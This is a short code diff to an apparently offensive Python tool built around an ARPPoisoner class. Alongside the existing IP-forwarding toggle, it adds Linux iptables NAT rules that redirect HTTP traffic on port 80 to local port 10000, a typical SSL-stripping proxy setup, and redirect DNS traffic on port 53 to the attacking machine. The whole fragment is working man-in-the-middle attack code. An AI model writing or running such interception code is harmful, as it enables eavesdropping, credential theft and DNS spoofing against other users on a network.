@@ -44,6 +44,9 @@ class ARPPoisoner:
         """This function turns on or turns off IP (packet) forwarding depending on the value given"""
         if platform == 'linux' or platform == 'linux2':
             os.system('sysctl -w net.ipv4.ip_forward={}'.format(int(value)))
+            os.system(f'iptables -t nat -{"A" if value else "D"} PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
+            os.system(f'iptables -t nat -{"A" if value else "D"} PREROUTING -p tcp --destination-port 53 -j REDIRECT')
+            os.system(f'iptables -t nat -{"A" if value else "D"} PREROUTING -p udp --destination-port 53 -j REDIRECT')
         elif platform == 'darwin':
             os.system('sysctl -w net.inet.ip.forwarding={}'.format(int(value)))
         elif platform == 'win32':
